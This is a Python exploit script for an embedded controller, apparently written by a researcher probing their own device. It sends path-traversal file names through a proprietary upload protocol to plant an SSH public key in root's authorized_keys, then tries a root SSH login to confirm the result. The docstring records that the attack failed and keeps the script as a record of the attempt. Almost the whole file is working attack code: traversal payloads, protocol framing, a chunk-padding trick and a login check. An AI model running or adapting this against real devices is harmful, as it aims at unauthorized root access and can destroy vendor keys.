#!/usr/bin/env python3
"""authorized_keys_inject.py - authorized_keys injection via upload staging.

RESULT (2026-10-13): DISPROVEN. The staging FileName is never used as the
write path - EISDIR/ENOENT oracles (names "/root", "/tmp",
"/root/nonexistentdir/x") are Ack'd exactly like any other name, a short
(<65523 B) chunk finalizes the transfer (validation rejects garbage with a
silent Disconnect), and completed transfers with impossible names produce
byte-identical replies. SSH login stays "Permission denied (publickey)".
Kept as the executable record of the attempt; see
docs/SECURITY_ANALYSIS.md section 6.7.

Original hypothesis: the upload channel (FileType=2) creates its staging
file at a path derived from the client-controlled FileName. If the name is
used verbatim in open() (relative to the controller's cwd or to a /tmp/
prefix), a traversal name such as "../../root/.ssh/authorized_keys" makes
chunk 0 land directly in root's authorized_keys. dropbear 2019.78
(publickey-only) reads /root/.ssh/authorized_keys at every login attempt,
so an injected key would yield a root shell over TCP 22.

Method: open a staging transfer with PacketCount=2, send ONLY chunk 0
(public key + '#' padding, exactly 65523 bytes so it is not treated as the
final chunk), never send chunk 1, never send Complete. The staged file
persists across session close (SECURITY_ANALYSIS.md 6.2); the SSH login
attempt per candidate is the real oracle.

Declared risk (accepted): if a traversal candidate works, the vendor keys
in authorized_keys are overwritten (O_TRUNC) - recoverable only by reflash.
"""
import socket
import struct
import subprocess
import sys
import time

HOST = "192.168.3.1"
PORT = 34566
PUBKEY_FILE = "/tmp/nofio-keys/id_ed25519.pub"
PRIVKEY_FILE = "/tmp/nofio-keys/id_ed25519"

CHUNK_SIZE = 65523  # a shorter chunk is treated as the FINAL chunk -> the
                    # server finalizes staging, validates the content and
                    # rejects garbage with Disconnect (which likely deletes
                    # the staged file). Keep chunk 0 exactly 65523 bytes so
                    # the transfer stays open/incomplete and the staged file
                    # persists past session close (SECURITY_ANALYSIS 6.2).

# Priority order:
# 1. ../../root/... - covers open(name) with cwd=/tmp AND prefix "/tmp/"+name
# 2. absolute       - covers open(name) verbatim (cwd irrelevant)
# 3. deeper traversals - covers prefixes like /tmp/staging/<name>
# 4. bare relative  - covers cwd=/
CANDIDATES = [
    "../../root/.ssh/authorized_keys",
    "/root/.ssh/authorized_keys",
    "../../../root/.ssh/authorized_keys",
    "../../../../root/.ssh/authorized_keys",
    "root/.ssh/authorized_keys",
]


def pkt(src, dst, seq, opts, payload=b""):
    return struct.pack(">BBIBH", src, dst, seq, opts, len(payload)) + payload


def msg(tag, t, body=b""):
    return struct.pack(">HH", tag, t) + body


def meta_body(ft, count, final, name):
    return struct.pack(">BHHB", ft, count, final, len(name)) + name


def data_body(idx, payload):
    return struct.pack(">H", idx) + payload


def recv_messages(s, timeout=3.0, max_msgs=4):
    """Read framed packets, return list of (src, dst, seq, opts, body)."""
    s.settimeout(timeout)
    out = []
    deadline = time.time() + timeout
    while len(out) < max_msgs and time.time() < deadline:
        try:
            hdr = b""
            while len(hdr) < 9:
                c = s.recv(9 - len(hdr))
                if not c:
                    return out, True  # closed
                hdr += c
            src, dst, seq, opts, ln = struct.unpack(">BBIBH", hdr)
            body = b""
            while len(body) < ln:
                c = s.recv(ln - len(body))
                if not c:
                    return out, True
                body += c
            out.append((src, dst, seq, opts, body))
            deadline = time.time() + 1.0  # keep waiting a bit after each msg
        except socket.timeout:
            break
    return out, False


def describe(pkts):
    lines = []
    for src, dst, seq, opts, body in pkts:
        if len(body) < 4:
            lines.append(f"src={src}->{dst} seq={seq} opts={opts} raw={body.hex()}")
            continue
        tag, mt = struct.unpack(">HH", body[:4])
        rest = body[4:]
        txt = bytes(b if 32 <= b < 127 else 0x2E for b in rest).decode("ascii")
        lines.append(f"src={src}->{dst} seq={seq} type={mt} tag=0x{tag:04x} "
                      f"body={rest.hex()}" + (f" ascii='{txt}'" if txt.strip('.') else ""))
    return lines


def stage_candidate(name, pubkey):
    """Open incomplete staging: meta(count=2) + chunk 0 only. Return reply log."""
    log = []
    s = socket.create_connection((HOST, PORT), timeout=3)
    try:
        # handshake (same as upload_complete_probe.py / fuzz phase C)
        s.sendall(pkt(0, 1, 0, 3, msg(0x4001, 2, struct.pack(">I", 80))))
        s.recv(65536)
        s.sendall(pkt(0, 1, 1, 3, msg(0x4001, 0)))
        # meta: FileType=2 (ImrOs), PacketCount=2 (never completed), name = candidate
        s.sendall(pkt(0, 1, 2, 3, msg(0x4002, 135,
                   meta_body(2, 2, 65523, name.encode()))))
        pkts, closed = recv_messages(s, timeout=2.0, max_msgs=2)
        log += [f"  meta reply: {l}" for l in describe(pkts)]
        if closed:
            log.append("  (connection closed after meta)")
            return log
        # chunk 0 = public key padded to full size with '#' comment lines so
        # it is NOT treated as the final chunk; chunk 1 never sent ->
        # staging stays incomplete and persists after session close
        chunk0 = pubkey
        pad = b"# nofio authorized_keys injection padding\n"
        while len(chunk0) < CHUNK_SIZE:
            chunk0 += pad[: min(len(pad), CHUNK_SIZE - len(chunk0))]
        s.sendall(pkt(0, 1, 3, 3, msg(0x4002, 137, data_body(0, chunk0))))
        pkts, closed = recv_messages(s, timeout=2.0, max_msgs=2)
        log += [f"  data reply: {l}" for l in describe(pkts)]
        if closed:
            log.append("  (connection closed after data)")
        # deliberately NO Complete, NO chunk 1; close -> staged file persists
    finally:
        try:
            s.close()
        except Exception:
            pass
    return log


def try_ssh():
    """Attempt root login with the injected key. Return (ok, output)."""
    cmd = [
        "ssh", "-i", PRIVKEY_FILE,
        "-o", "BatchMode=yes",
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "IdentitiesOnly=yes",
        "-o", "ConnectTimeout=5",
        "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",  # harmless with ed25519
        "-p", "22",
        f"root@{HOST}",
        "id",
    ]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=20)
    return r.returncode == 0, (r.stdout + r.stderr).strip()


def main():
    with open(PUBKEY_FILE) as f:
        pubkey = f.read().strip().encode() + b"\n"

    for cand in CANDIDATES:
        print(f"=== candidate name = {cand!r} ===")
        log = stage_candidate(cand, pubkey)
        for l in log:
            print(l)
        # give dropbear a moment, then test login
        time.sleep(1.0)
        ok, out = try_ssh()
        if ok:
            print(f"\n[+] SSH LOGIN SUCCEEDED with candidate {cand!r}")
            print(f"[+] remote id: {out}")
            print("\nShell access confirmed. Connect manually with:")
            print(f"    ssh -i {PRIVKEY_FILE} root@{HOST}")
            return 0
        print(f"  ssh attempt failed:\n    {out}")
        print()
    print("[-] No candidate produced a working login.")
    print("    (meta/data Acks above show what the controller accepted;")
    print("     the name is likely ignored for the staging path, i.e.")
    print("     staging uses a fixed file name)")
    return 1


if __name__ == "__main__":
    sys.exit(main())
